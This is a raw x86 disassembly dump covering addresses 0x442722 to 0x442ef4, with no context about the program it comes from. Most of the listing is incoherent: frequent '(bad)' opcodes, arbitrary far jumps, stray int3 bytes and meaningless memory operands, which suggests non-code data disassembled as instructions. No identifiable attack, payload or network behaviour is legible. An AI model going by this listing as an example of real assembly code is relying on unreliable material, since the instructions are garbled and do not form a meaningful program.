  442722:	(bad)  
  442723:	inc    DWORD PTR [ebx+0x22]
  442726:	nop
  442727:	or     al,BYTE PTR [eax]
  442729:	add    BYTE PTR [eax],al
  44272b:	add    bh,bh
  44272d:	or     al,0x1c
  44272f:	mov    al,0x2e
  442731:	inc    DWORD PTR [eax]
  442733:	int3   
  442734:	inc    ecx
  442735:	ss rep ins BYTE PTR es:[edi],dx
  442738:	cmp    edi,0xffffffcc
  44273b:	(bad)  
  44273c:	push   DWORD PTR [eax-0x82429b]
  442742:	add    bh,bh
  442744:	xchg   ecx,eax
  442745:	(bad)  
  442746:	fsubr  QWORD PTR [edx-0xff7d00]
  44274c:	inc    DWORD PTR [edi+ebp*8]
  44274f:	cmp    BYTE PTR [edi+edi*8-0x48610034],bh
  442756:	leave  
  442757:	popa   
  442758:	int3   
  442759:	or     DWORD PTR [ecx+0x3be7ccff],0x44
  442760:	xchg   edi,edi
  442762:	inc    DWORD PTR [ebx-0x2c4f2f69]
  442768:	int3   
  442769:	dec    DWORD PTR [ecx+0x4dd8ffcc]
  44276f:	jns    0x4426f2
  442771:	add    DWORD PTR [eax],0xffffffff
  442774:	jne    0x442745
  442776:	push   esi
  442777:	pushf  
  442778:	add    BYTE PTR [eax],al
  44277a:	cmp    edi,0xffffff83
  44277d:	push   ebx
  44277e:	pop    ebx
  44277f:	dec    ebp
  442780:	cs add bh,bh
  442783:	add    dl,dl
  442785:	ds nop
  442787:	pusha  
  442788:	(bad)  
  442789:	dec    esp
  44278b:	add    BYTE PTR [eax],al
  44278d:	dec    esp
  44278e:	imul   ecx,DWORD PTR [eax-0x7646],0xffffffc9
  442795:	jne    0x4427fa
  442797:	in     eax,0x0
  442799:	inc    DWORD PTR [eax]
  44279b:	add    BYTE PTR [eax],al
  44279d:	jne    0x442792
  44279f:	test   eax,0xffffccd1
  4427a4:	pop    esp
  4427a5:	sbb    al,BYTE PTR [ebp-0xff7c49]
  4427ab:	inc    DWORD PTR [eax]
  4427ad:	jmp    0xff00:0xff1f589c
  4427b4:	ja     0x442786
  4427b6:	and    al,BYTE PTR [ecx+0x0]
  4427b9:	(bad)  
  4427ba:	inc    DWORD PTR [ebx-0x14c7f200]
  4427c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4427c1:	add    bh,bh
  4427c3:	push   DWORD PTR [eax]
  4427c5:	cmp    dh,BYTE PTR [esi+0xc]
  4427c8:	add    ah,cl
  4427ca:	mov    DWORD PTR [ebx-0x5b120100],eax
  4427d0:	xor    bh,bh
  4427d2:	add    BYTE PTR [eax],al
  4427d4:	outs   dx,DWORD PTR ds:[esi]
  4427d5:	jnp    0x4427d1
  4427d7:	ins    BYTE PTR es:[edi],dx
  4427d8:	(bad)  
  4427d9:	(bad)  
  4427da:	(bad)  
  4427db:	dec    esp
  4427dd:	add    dh,BYTE PTR [esi-0x12]
  4427e0:	js     0x4427e1
  4427e2:	(bad)  
  4427e3:	push   DWORD PTR [ecx-0x39]
  4427e6:	cwde   
  4427e7:	es (bad) 
  4427e9:	(bad)  
  4427ea:	inc    DWORD PTR [eax]
  4427ec:	add    BYTE PTR [ecx],bh
  4427ee:	hlt    
  4427ef:	push   edx
  4427f0:	sar    edi,1
  4427f2:	cmp    edi,0x21
  4427f5:	xchg   edi,eax
  4427f6:	int3   
  4427f7:	add    eax,0xffffff00
  4427fc:	int3   
  4427fd:	xor    eax,0xff8766b2
  442802:	add    BYTE PTR [eax],al
  442804:	mov    esi,0x3f9b9e
  442809:	(bad)  
  44280a:	inc    DWORD PTR [eax]
  44280c:	push   DWORD PTR [edi+0xd9f22c]
  442812:	add    DWORD PTR [eax],0x62
  442815:	mov    dh,0x9e
  442817:	sub    eax,DWORD PTR [ebx-0x330001]
  44281d:	cmc    
  44281e:	pop    ecx
  44281f:	xchg   DWORD PTR [ecx+0x0],edi
  442822:	(bad)  
  442823:	inc    DWORD PTR [esi-0x52]
  442826:	fld1   
  442828:	inc    DWORD PTR [ebx+0x6783ffff]
  44282e:	mov    ah,0x7a
  442830:	cmc    
  442831:	inc    DWORD PTR [eax]
  442833:	jmp    DWORD PTR [ebx+0x3b]
  442836:	adc    al,0x79
  442838:	add    bh,bh
  44283a:	inc    DWORD PTR [ebx-0x66770c00]
  442840:	(bad)  
  442841:	int3   
  442842:	add    BYTE PTR [eax],al
  442844:	daa    
  442845:	cmp    BYTE PTR [edx+0x79],bh
  442848:	inc    DWORD PTR [ebx-0x1a000034]
  44284e:	mov    edx,0xff002995
  442853:	(bad)  
  442854:	cmp    al,0x7
  442856:	popa   
  442857:	pop    esi
  442858:	add    BYTE PTR [ebx+0x18ff00cc],al
  44285e:	push   0xffffffaf
  442860:	mov    ah,0xff
  442862:	add    bh,bh
  442864:	adc    esi,DWORD PTR [edi-0x37]
  442867:	xchg   ebx,eax
  442868:	add    bh,bh
  44286a:	add    BYTE PTR [eax],al
  44286c:	mov    DWORD PTR [eax],edx
  44286e:	add    DWORD PTR [ebx-0x5e],edx
  442871:	inc    DWORD PTR [eax]
  442873:	(bad)  
  442874:	out    dx,al
  442875:	sub    BYTE PTR [edx*1-0xff337d],0xff
  44287d:	mov    esi,0x2aadd4
  442882:	add    ah,cl
  442884:	push   0xff3d42c3
  442889:	(bad)  
  44288a:	(bad)  
  44288b:	inc    DWORD PTR [eax]
  44288d:	lahf   
  44288e:	add    al,0x97
  442890:	in     eax,0x0
  442892:	(bad)  
  442893:	dec    DWORD PTR [edi+0x33]
  442896:	shl    BYTE PTR [ecx+0x0],0x0
  44289a:	int3   
  44289b:	add    BYTE PTR [ebx+0x6f7fb52f],al
  4428a1:	add    BYTE PTR [eax],al
  4428a3:	int3   
  4428a4:	add    al,0xe6
  4428a6:	jmp    0x4428de
  4428a8:	int3   
  4428a9:	(bad)  
  4428aa:	dec    esp
  4428ac:	(bad)  
  4428ad:	jle    0x442878
  4428af:	pushf  
  4428b0:	add    al,0x83
  4428b2:	(bad)  
  4428b3:	(bad)  
  4428b4:	fsub   DWORD PTR [edi]
  4428b6:	daa    
  4428b7:	sub    al,0xff
  4428b9:	inc    DWORD PTR [eax]
  4428bb:	inc    DWORD PTR [ebx+0x77333b20]
  4428c1:	or     esp,0x0
  4428c4:	scas   eax,DWORD PTR es:[edi]
  4428c5:	data16 lahf 
  4428c7:	test   BYTE PTR [eax],0xff
  4428ca:	inc    DWORD PTR [eax]
  4428cc:	add    BYTE PTR [ebx+ecx*1],bl
  4428cf:	jmp    0x2ea4:0xb0
  4428d6:	xor    eax,eax
  4428d8:	(bad)  
  4428d9:	inc    DWORD PTR [ebx-0x53400000]
  4428df:	sar    DWORD PTR [edi],0xff
  4428e2:	add    BYTE PTR [eax],al
  4428e4:	mov    ds:0x2b4ce0,al
  4428e9:	(bad)  
  4428ea:	inc    DWORD PTR [eax]
  4428ec:	add    dl,bh
  4428ee:	mov    ebp,0xcc0068cd
  4428f3:	jmp    FWORD PTR [ebp+0x24]
  4428f6:	(bad)  
  4428f7:	jg     0x4428f8
  4428f9:	add    bh,bh
  4428fb:	add    bh,bh
  4428fd:	and    eax,0xff78a67c
  442902:	add    bh,bh
  442904:	lds    ebx,FWORD PTR [edi]
  442906:	lock scas eax,DWORD PTR es:[edi]
  442908:	inc    DWORD PTR [eax]
  44290a:	(bad)  
  44290b:	inc    DWORD PTR [eax]
  44290d:	fwait
  44290e:	jo     0x442963
  442910:	fdivp  st(7),st
  442912:	dec    esp
  442914:	mov    ch,0x24
  442916:	cmp    eax,0x8900003f
  44291b:	cmp    edi,0xa
  44291e:	push   ecx
  44291f:	sbb    al,0x61
  442921:	(bad)  
  442922:	inc    DWORD PTR [eax]
  442924:	cdq    
  442925:	mov    dh,0x26
  442927:	inc    DWORD PTR ss:[ebx+0x748900ff]
  44292e:	adc    BYTE PTR [esi+0x13],0xff
  442932:	int3   
  442933:	sbb    DWORD PTR [edx+0xe6a371],0xffffffff
  44293a:	(bad)  
  44293b:	(bad)  
  44293c:	call   FWORD PTR [ecx+eax*4+0x6e]
  442940:	adc    edi,edi
  442942:	(bad)  
  442943:	push   DWORD PTR [eax-0x3b]
  442946:	jae    0x4428f6
  442948:	dec    DWORD PTR [ecx-0x8000001]
  44294e:	call   0x442423
  442953:	int3   
  442954:	popf   
  442955:	pop    es
  442956:	adc    dl,dh
  442958:	cmp    edi,0x0
  44295b:	add    DWORD PTR [eax],0x2d
  44295e:	jecxz  0x4428e4
  442960:	adc    esp,ecx
  442962:	(bad)  
  442963:	(bad)  
  442964:	in     al,dx
  442965:	sti    
  442966:	and    eax,0xff83c9
  44296b:	cmp    edi,0xffffffb9
  44296e:	mov    bl,BYTE PTR [eax+0x2d]
  442971:	(bad)  
  442972:	(bad)  
  442973:	(bad)  
  442974:	cmp    eax,0x89934c25
  442979:	(bad)  
  44297a:	(bad)  
  44297b:	inc    DWORD PTR [eax]
  44297d:	inc    ebp
  44297e:	mov    BYTE PTR [edx-0x50],ah
  442981:	(bad)  
  442982:	inc    DWORD PTR [eax]
  442984:	and    ebp,DWORD PTR [eax+0x53]
  442987:	xchg   esp,eax
  442988:	cmp    edi,0x0
  44298b:	inc    DWORD PTR [eax]
  44298d:	retf   
  44298e:	xor    cl,ah
  442990:	call   0xf527:0x1700ffff
  442997:	jne    0x442998
  442999:	mov    DWORD PTR [ebx+0x7be200ff],eax
  44299f:	fs dec edx
  4429a1:	(bad)  
  4429a2:	(bad)  
  4429a3:	dec    eax
  4429a5:	rol    BYTE PTR [esi],0xb9
  4429a8:	mov    edi,edi
  4429aa:	int3   
  4429ab:	mov    DWORD PTR [ecx-0x5e698879],ecx
  4429b1:	add    DWORD PTR [eax],0xffffffff
  4429b4:	dec    esi
  4429b5:	jecxz  0x4429ae
  4429b7:	imul   ecx,esp,0xffffff89
  4429ba:	add    bh,bh
  4429bc:	mov    DWORD PTR [ebx-0xc306c1],ebp
  4429c2:	dec    esp
  4429c4:	push   ss
  4429c5:	jle    0x442a31
  4429c7:	mov    ah,0x0
  4429c9:	add    BYTE PTR [eax],al
  4429cb:	mov    DWORD PTR [eax],eax
  4429cd:	pop    esi
  4429ce:	nop
  4429cf:	jp     0x442961
  4429d1:	(bad)  
  4429d2:	(bad)  
  4429d3:	jmp    DWORD PTR [eax]
  4429d5:	fld    QWORD PTR [esi]
  4429d7:	pushf  
  4429d8:	inc    DWORD PTR [eax]
  4429da:	(bad)  
  4429db:	(bad)  
  4429dc:	inc    DWORD PTR [ecx+eiz*8]
  4429df:	push   eax
  4429e0:	mov    ecx,DWORD PTR [ecx-0x146b0034]
  4429e6:	mov    ebp,0xff89ffc3
  4429eb:	dec    DWORD PTR [ecx-0xaccde0b]
  4429f1:	int3   
  4429f2:	add    BYTE PTR [ebx-0x4e2457c],al
  4429f8:	(bad)  
  4429f9:	(bad)  
  4429fa:	dec    esp
  4429fc:	add    BYTE PTR [ebx],bl
  4429fe:	pop    ebp
  4429ff:	std    
  442a00:	clc    
  442a01:	cmp    edi,0x0
  442a04:	add    BYTE PTR [ecx+0x2e],0x34
  442a08:	mov    edi,edi
  442a0a:	dec    esp
  442a0c:	add    BYTE PTR [edi-0x29],cl
  442a0f:	ret    
  442a10:	xor    eax,0xeb00ffcc
  442a15:	jb     0x4429a4
  442a17:	inc    edi
  442a18:	int3   
  442a19:	inc    DWORD PTR [eax]
  442a1b:	add    BYTE PTR [eax],al
  442a1d:	mov    ecx,0x4d3290
  442a22:	add    ah,cl
  442a24:	jno    0x4429e6
  442a26:	repnz cmp bh,bh
  442a29:	int3   
  442a2a:	(bad)  
  442a2b:	dec    DWORD PTR [ecx-0x3de5f9c3]
  442a31:	(bad)  
  442a32:	(bad)  
  442a33:	call   ebx
  442a35:	mov    WORD PTR [eax],?
  442a37:	int3   
  442a38:	inc    DWORD PTR [eax]
  442a3a:	inc    DWORD PTR [ebx-0xc26e901]
  442a40:	jmp    0xce29:0xd289ffff
  442a47:	(bad)  
  442a48:	(bad)  
  442a49:	(bad)  
  442a4a:	dec    esp
  442a4c:	cmp    DWORD PTR [esi+edx*4],0xffffffc3
  442a50:	addr16 dec esp
  442a53:	add    BYTE PTR [ebx+0x2d28ea],ch
  442a59:	add    ah,cl
  442a5b:	add    bh,bh
  442a5d:	inc    edi
  442a5e:	popa   
  442a5f:	adc    eax,0xffffffb6
  442a64:	inc    edx
  442a65:	arpl   WORD PTR [ecx+esi*1],si
  442a68:	mov    edi,edi
  442a6a:	(bad)  
  442a6b:	(bad)  
  442a6c:	jmp    esi
  442a6e:	dec    eax
  442a6f:	(bad)  
  442a70:	retf   
  442a71:	cmp    edi,0xffffffff
  442a74:	out    dx,al
  442a75:	or     bh,BYTE PTR [ebp+0x15]
  442a78:	add    bh,bh
  442a7a:	add    BYTE PTR [ecx-0x5d928f00],cl
  442a80:	mov    edi,?
  442a82:	inc    DWORD PTR [ebx-0x7f97faac]
  442a88:	add    DWORD PTR [eax],0xffffffff
  442a8b:	add    bh,bh
  442a8d:	daa    
  442a8e:	adc    dh,BYTE PTR [edx+0x83fe]
  442a94:	jmp    0xff768d53
  442a99:	(bad)  
  442a9a:	(bad)  
  442a9b:	inc    DWORD PTR [eax]
  442a9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442a9e:	pop    ds
  442a9f:	in     eax,dx
  442aa0:	sbb    al,0xff
  442aa2:	dec    esp
  442aa4:	mov    WORD PTR [edi+0xff4341],gs
  442aaa:	(bad)  
  442aab:	inc    DWORD PTR [ebx-0x3e05c116]
  442ab1:	add    bh,bh
  442ab3:	inc    ebx
  442ab5:	adc    al,0xf1
  442ab7:	jnp    0x442ab9
  442ab9:	(bad)  
  442aba:	dec    esp
  442abc:	push   DWORD PTR [eax-0x7679dde8]
  442ac2:	int3   
  442ac3:	int3   
  442ac4:	imul   ecx,DWORD PTR [esp+eiz*4-0x7c7cff99],0xffffff89
  442acc:	add    bh,cl
  442ace:	xchg   esi,eax
  442acf:	dec    esp
  442ad0:	add    eax,DWORD PTR [eax]
  442ad2:	int3   
  442ad3:	add    BYTE PTR [ecx+0x6e2157],cl
  442ad9:	add    DWORD PTR [eax],0xffffffff
  442adc:	add    dl,dh
  442ade:	int3   
  442adf:	jno    0x442b52
  442ae1:	add    BYTE PTR [ecx+0x78304e89],cl
  442ae7:	xlat   BYTE PTR ds:[ebx]
  442ae8:	or     DWORD PTR [ecx-0x24340000],0xffffffa6
  442aef:	sub    al,0xa8
  442af1:	cmp    edi,0x0
  442af4:	xor    DWORD PTR [edi-0x7c7cbc81],esi
  442afa:	dec    DWORD PTR [ecx-0x387ac701]
  442b00:	mov    al,BYTE PTR [ebx-0x4a77ff01]
  442b06:	in     eax,dx
  442b07:	jg     0x442b08
  442b09:	inc    DWORD PTR [eax]
  442b0b:	cmp    edi,0x6
  442b0e:	js     0x442b0e
  442b10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442b11:	mov    DWORD PTR [eax],eax
  442b13:	mov    DWORD PTR ds:0xd0c3d8,eax
  442b19:	or     esp,0xffffffcc
  442b1c:	add    ch,bl
  442b1e:	sar    BYTE PTR ss:[ebx-0x22007601],cl
  442b25:	es jg  0x442b95
  442b28:	add    ah,cl
  442b2a:	inc    DWORD PTR [eax]
  442b2c:	inc    DWORD PTR [edi]
  442b2e:	push   cs
  442b2f:	mov    ds:0xcccc8961,al
  442b34:	int3   
  442b35:	fld    DWORD PTR [edx-0x27]
  442b38:	inc    DWORD PTR [ebx+0x65ffff89]
  442b3e:	dec    edx
  442b3f:	jbe    0x442ad6
  442b41:	(bad)  
  442b42:	(bad)  
  442b43:	jmp    DWORD PTR [edi+0x6a]
  442b46:	enter  0x83ad,0xff
  442b4a:	inc    DWORD PTR [eax]
  442b4c:	(bad)  
  442b4d:	mov    esp,0x54a6bd
  442b52:	(bad)  
  442b53:	(bad)  
  442b54:	jns    0x442b21
  442b56:	and    cl,bh
  442b58:	add    bh,bh
  442b5a:	cmp    edi,0xffffffff
  442b5d:	in     eax,dx
  442b5e:	out    dx,al
  442b5f:	test   al,bh
  442b61:	int3   
  442b62:	mov    DWORD PTR [eax],eax
  442b64:	push   0xfea65
  442b69:	cmp    edi,0x0
  442b6c:	push   DWORD PTR [edi]
  442b6e:	cs lock mov ah,0x89
  442b72:	int3   
  442b73:	(bad)  
  442b74:	jle    0x442bce
  442b76:	daa    
  442b77:	mov    DWORD PTR fs:[ebx+0x1b83ffff],eax
  442b7e:	sub    al,0xfb
  442b80:	outs   dx,DWORD PTR ds:[esi]
  442b81:	int3   
  442b82:	add    bh,bh
  442b84:	test   DWORD PTR [ecx-0xff8341],0xcdcc8389
  442b8e:	mov    edx,0xff89d655
  442b93:	int3   
  442b94:	pushf  
  442b95:	in     al,0xed
  442b97:	scas   eax,DWORD PTR es:[edi]
  442b98:	add    BYTE PTR [eax],al
  442b9a:	inc    DWORD PTR [eax]
  442b9c:	mov    DWORD PTR [edi-0x38],ebx
  442b9f:	mov    cl,0x92
  442ba1:	(bad)  
  442ba2:	inc    DWORD PTR [eax]
  442ba4:	cmp    esi,DWORD PTR [eax+edx*4+0x3e]
  442ba8:	inc    DWORD PTR [eax]
  442baa:	(bad)  
  442bab:	inc    DWORD PTR [eax]
  442bad:	inc    ecx
  442bae:	xchg   DWORD PTR [edx-0x65],esp
  442bb1:	(bad)  
  442bb2:	dec    esp
  442bb4:	(bad)
  442bb9:	(bad)  
  442bba:	(bad)  
  442bbb:	dec    DWORD PTR [ecx-0x1f4395b8]
  442bc1:	add    DWORD PTR [eax],0xffffffff
  442bc4:	sbb    al,0xec
  442bc7:	or     al,0x89
  442bc9:	add    bh,bh
  442bcb:	mov    DWORD PTR [ebx-0x12bb57bb],eax
  442bd1:	dec    esp
  442bd3:	add    BYTE PTR [eax-0x45],bl
  442bd6:	(bad)  
  442bd7:	ror    ah,1
  442bd9:	add    bh,bh
  442bdb:	(bad)  
  442bdc:	call   DWORD PTR [edi]
  442bde:	or     edx,DWORD PTR gs:[ebp+0x47ffffff]
  442be5:	adc    ecx,DWORD PTR [ebx-0x7d]
  442be8:	(bad)  
  442be9:	(bad)  
  442bea:	dec    DWORD PTR [ecx+0x453c4bff]
  442bf0:	mov    al,ds:0xb200ffff
  442bf5:	shl    dh,1
  442bf7:	xchg   BYTE PTR [ebx+0x838383],al
  442bfd:	sbb    ebx,ebp
  442bff:	xchg   BYTE PTR fs:[ebx-0x2d120000],al
  442c06:	das    
  442c07:	or     al,0xcc
  442c09:	add    BYTE PTR [eax],al
  442c0b:	or     esp,0x47
  442c0e:	lods   al,BYTE PTR ds:[esi]
  442c0f:	adc    DWORD PTR [ebp+0x0],eax
  442c12:	mov    DWORD PTR [eax],eax
  442c14:	pop    ecx
  442c15:	jo     0x442c2e
  442c17:	mov    ds:0xff00ffff,al
  442c1c:	int3   
  442c1d:	mov    ebp,gs
  442c1f:	add    DWORD PTR [ecx],ebp
  442c21:	add    BYTE PTR [eax],al
  442c23:	jmp    DWORD PTR [ebp-0x6b]
  442c26:	sub    edi,esp
  442c28:	inc    DWORD PTR [eax]
  442c2a:	add    BYTE PTR [eax],al
  442c2c:	add    BYTE PTR [ebp-0x715dbc],ch
  442c32:	inc    DWORD PTR [eax]
  442c34:	mov    ds:0xff791b4f,al
  442c39:	add    DWORD PTR [eax],0xffffffff
  442c3c:	push   DWORD PTR [esi+0x51]
  442c3f:	std    
  442c40:	add    BYTE PTR [eax],0x83
  442c43:	dec    ebx
  442c45:	jmp    0xff44500c
  442c4a:	add    DWORD PTR [eax],0x0
  442c4d:	xchg   ebp,eax
  442c4e:	pop    es
  442c4f:	(bad)  
  442c50:	aam    0x0
  442c52:	add    bh,bh
  442c54:	iret   
  442c55:	jp     0x442c53
  442c57:	int    0xff
  442c59:	(bad)  
  442c5a:	(bad)  
  442c5b:	(bad)  
  442c5c:	(bad)  
  442c5d:	fistp  DWORD PTR [ebx+esi*4+0x1d]
  442c61:	cmp    edi,0xffffff83
  442c64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442c65:	out    0x72,eax
  442c67:	jmp    0x84442c6b
  442c6c:	add    BYTE PTR [ebp+0xbdaf77],ch
  442c72:	dec    esp
  442c74:	fild   WORD PTR [edx+0x2]
  442c77:	add    eax,0xcccc8383
  442c7c:	add    BYTE PTR [ebx-0x114768],cl
  442c82:	mov    DWORD PTR [ebx-0x70598519],eax
  442c88:	add    BYTE PTR [eax],al
  442c8a:	int3   
  442c8b:	(bad)  
  442c8c:	push   DWORD PTR [esi]
  442c8e:	jg     0x442cb8
  442c90:	clc    
  442c91:	cmp    edi,0xffffffcc
  442c94:	out    0x11,eax
  442c96:	mov    ah,0x8e
  442c98:	dec    DWORD PTR [ecx-0x78ff0100]
  442c9e:	aam    0xe
  442ca0:	jmp    0x2144f9a4
  442ca5:	mov    ebx,0x699f
  442caa:	add    DWORD PTR [eax],0xffffffff
  442cad:	lods   eax,DWORD PTR ds:[esi]
  442cae:	adc    ecx,DWORD PTR [ebx+0x10]
  442cb4:	xlat   BYTE PTR ds:[ebx]
  442cb5:	dec    edi
  442cb6:	pop    esi
  442cb7:	mov    edx,0x8900ff00
  442cbc:	add    ch,al
  442cbe:	out    0x91,al
  442cc0:	adc    BYTE PTR [ebx-0x24db0100],al
  442cc6:	push   edx
  442cc7:	cmc    
  442cc8:	inc    DWORD PTR [eax]
  442cca:	add    BYTE PTR [ecx-0x7199b87d],cl
  442cd0:	sub    eax,DWORD PTR [eax]
  442cd2:	int3   
  442cd3:	add    BYTE PTR [esi],bl
  442cd5:	xchg   ecx,eax
  442cd6:	add    BYTE PTR [ecx-0xffff34],bl
  442cdc:	add    BYTE PTR [eax+0x48eb5f],ch
  442ce2:	add    DWORD PTR [eax],0xfffffffc
  442ce5:	mov    dl,0xa0
  442ce7:	add    bh,bh
  442ce9:	dec    esp
  442ceb:	add    bh,bh
  442ced:	push   esp
  442cee:	fist   WORD PTR ds:0xffff69
  442cf4:	into   
  442cf5:	lods   eax,DWORD PTR ds:[esi]
  442cf6:	and    bh,bl
  442cf8:	add    BYTE PTR [eax],al
  442cfa:	mov    edi,edi
  442cfc:	jmp    DWORD PTR [edx-0x17]
  442cff:	fstp   QWORD PTR [eax+0x0]
  442d02:	inc    DWORD PTR [eax]
  442d04:	out    0x3c,eax
  442d06:	mov    esp,0xff52
  442d0b:	inc    DWORD PTR [eax]
  442d0d:	sub    al,0x84
  442d0f:	imul   edx,DWORD PTR [edx+0x0],0xffffffff
  442d13:	cmp    DWORD PTR [edi+0x1e],0xffffff8a
  442d17:	mov    al,ds:0xcc00ff00
  442d1c:	(bad)  
  442d1d:	in     eax,dx
  442d1e:	xor    dh,BYTE PTR [edi+edx*1-0x1]
  442d22:	add    bh,bh
  442d24:	sbb    eax,0xff53c666
  442d29:	(bad)  
  442d2a:	dec    esp
  442d2c:	(bad)  
  442d2d:	fnsave [ebp-0x330077a7]
  442d33:	mov    eax,edi
  442d35:	out    dx,al
  442d36:	cli    
  442d37:	mov    eax,ds:0xffffcc89
  442d3c:	adc    DWORD PTR [ebp+0x1],0x49
  442d40:	(bad)  
  442d42:	cmp    edi,0xffffffda
  442d45:	stos   DWORD PTR es:[edi],eax
  442d46:	lods   eax,DWORD PTR ds:[esi]
  442d47:	lock add bh,bh
  442d4a:	add    BYTE PTR [ebx-0x52f7277d],al
  442d50:	(bad)  
  442d51:	(bad)  
  442d52:	inc    DWORD PTR [ebx+0x30321191]
  442d58:	(bad)  
  442d59:	inc    DWORD PTR [eax]
  442d5b:	add    DWORD PTR [eax],0xffffff9e
  442d5e:	cmp    BYTE PTR [esi+0x898306],dh
  442d64:	les    esi,FWORD PTR [ebp-0x7600ac0f]
  442d6a:	add    bh,bh
  442d6c:	sbb    esp,0x79
  442d6f:	ins    BYTE PTR es:[edi],dx
  442d70:	fadd   DWORD PTR [eax]
  442d72:	cmp    edi,0x26
  442d75:	aaa    
  442d76:	jno    0x442d86
  442d78:	(bad)  
  442d79:	inc    DWORD PTR [eax]
  442d7b:	add    bh,bh
  442d7d:	jl     0x442dbb
  442d7f:	iret   
  442d80:	sub    bh,bh
  442d82:	(bad)  
  442d83:	dec    DWORD PTR [ecx+0x20]
  442d86:	add    eax,ecx
  442d88:	inc    DWORD PTR [ebx+0x5400ff00]
  442d8e:	mov    al,ds:0xff0b3a
  442d93:	(bad)  
  442d94:	jge    0x442d86
  442d96:	jae    0x442d8f
  442d98:	add    BYTE PTR [ebx-0x68010000],al
  442d9e:	ins    BYTE PTR es:[edi],dx
  442d9f:	xchg   ecx,eax
  442da0:	call   0xd2442e2e
  442da5:	loopne 0x442dfa
  442da7:	mov    cl,0x0
  442da9:	(bad)  
  442daa:	(bad)  
  442dab:	inc    DWORD PTR [eax]
  442dad:	shl    cl,0x78
  442db0:	dec    ebx
  442db1:	mov    DWORD PTR [eax],eax
  442db3:	mov    DWORD PTR [edx],edi
  442db5:	mov    WORD PTR [eax+0x43],?
  442db8:	(bad)  
  442db9:	(bad)  
  442dba:	(bad)  
  442dbb:	(bad)  
  442dbc:	push   DWORD PTR [edx-0x7c199e33]
  442dc2:	add    BYTE PTR [eax],al
  442dc4:	cdq    
  442dc5:	(bad)  
  442dc7:	(bad)  
  442dc8:	dec    esp
  442dca:	inc    DWORD PTR [ebx-0x741a457d]
  442dd0:	pusha  
  442dd1:	(bad)  
  442dd2:	inc    DWORD PTR [eax]
  442dd4:	adc    DWORD PTR [edx+0x837a2e],0x2fffffff
  442dde:	fnstsw WORD PTR ds:[edx]
  442de1:	inc    DWORD PTR [eax]
  442de3:	adc    DWORD PTR [ebx+ebp*1+0xdbf4],0xffffffff
  442deb:	add    BYTE PTR [eax],al
  442ded:	inc    esi
  442dee:	test   eax,0x8983fc89
  442df3:	jmp    DWORD PTR [esi]
  442df5:	push   edx
  442df6:	iret   
  442df7:	sub    al,0x0
  442df9:	add    BYTE PTR [eax],al
  442dfb:	inc    DWORD PTR [eax]
  442dfd:	imul   edi,edi,0x6f
  442e00:	jo     0x442e01
  442e02:	inc    DWORD PTR [eax]
  442e04:	jne    0x442e1a
  442e06:	mov    ch,0x33
  442e08:	inc    DWORD PTR [eax]
  442e0a:	add    bh,bh
  442e0c:	jmp    FWORD PTR [esi-0x3301a761]
  442e12:	add    bh,bh
  442e14:	in     al,0x52
  442e16:	xchg   BYTE PTR [eax+eax*1+0x0],dl
  442e1a:	int3   
  442e1b:	cmp    edi,0xe
  442e1e:	in     al,dx
  442e1f:	cld    
  442e20:	aam    0xff
  442e22:	(bad)  
  442e23:	call   DWORD PTR [ebx-0x20]
  442e26:	stos   BYTE PTR es:[edi],al
  442e27:	push   edi
  442e28:	(bad)  
  442e29:	(bad)  
  442e2a:	dec    DWORD PTR [ecx-0x53fa5301]
  442e30:	xlat   BYTE PTR ds:[ebx]
  442e31:	add    ah,cl
  442e33:	add    BYTE PTR [ebx+ecx*8],dl
  442e36:	or     DWORD PTR [edx-0x7d00],ebp
  442e3c:	jmp    DWORD PTR [edi+0x53]
  442e3f:	dec    ebx
  442e40:	sar    edi,1
  442e42:	or     DWORD PTR [ecx-0x510f613a],0xffffffff
  442e49:	inc    DWORD PTR [eax]
  442e4b:	inc    DWORD PTR [eax]
  442e4d:	fndisi(8087 only) 
  442e4f:	sbb    eax,DWORD PTR [edx+0x0]
  442e52:	inc    DWORD PTR [eax]
  442e54:	mov    edi,0xcb0db9
  442e59:	add    BYTE PTR [ebx-0x186d0001],al
  442e5f:	test   BYTE PTR [ecx+0x1089ccff],ah
  442e65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442e66:	mov    ecx,0xffff00c1
  442e6b:	inc    DWORD PTR [ebx-0x6ec3af41]
  442e71:	dec    esp
  442e73:	push   DWORD PTR [esi]
  442e75:	(bad)  
  442e76:	inc    esi
  442e77:	(bad)  
  442e79:	add    bh,bh
  442e7b:	add    bh,bh
  442e7d:	xor    al,BYTE PTR [eax+edi*8+0xffff1e]
  442e84:	and    dh,dh
  442e86:	arpl   WORD PTR cs:[ecx+0xff0000],cx
  442e8d:	outs   dx,DWORD PTR ds:[esi]
  442e8e:	leave  
  442e8f:	(bad)  
  442e90:	fld    QWORD PTR [ebx-0x63ee0100]
  442e96:	imul   ebx,eax,0x0
  442e99:	inc    DWORD PTR [ebx-0x6c2a007d]
  442e9f:	ds (bad) 
  442ea1:	(bad)  
  442ea2:	inc    DWORD PTR [eax]
  442ea4:	clc    
  442ea5:	push   cs
  442ea6:	aad    0xbe
  442ea8:	mov    DWORD PTR [ecx-0x5fff0001],ecx
  442eae:	cs add al,0xca
  442eb1:	mov    edi,edi
  442eb3:	add    ah,al
  442eb5:	clc    
  442eb6:	pop    ss
  442eb7:	(bad)  
  442eb9:	int3   
  442eba:	inc    DWORD PTR [eax]
  442ebc:	add    BYTE PTR [esi],dl
  442ebe:	rcl    DWORD PTR [ebx-0x7ca9],0x3b
  442ec5:	mov    ebx,0xff005d3b
  442eca:	inc    DWORD PTR [eax]
  442ecc:	add    BYTE PTR [edx],dl
  442ece:	aad    0x35
  442ed0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442ed1:	(bad)  
  442ed2:	inc    DWORD PTR [eax]
  442ed4:	imul   edx,DWORD PTR [edx-0x76ffc83b],0x0
  442edb:	add    bh,bh
  442edd:	mov    eax,0xff6e7c83
  442ee2:	inc    DWORD PTR [eax]
  442ee4:	pushf  
  442ee5:	hlt    
  442ee6:	scas   al,BYTE PTR es:[edi]
  442ee7:	outs   dx,BYTE PTR ds:[esi]
  442ee8:	dec    esp
  442eea:	dec    esp
  442eec:	add    cl,bl
  442eee:	push   ebx
  442eef:	pop    esp
  442ef0:	test   BYTE PTR [eax],al
  442ef2:	inc    DWORD PTR [eax]
  442ef4:	and    al,0x82
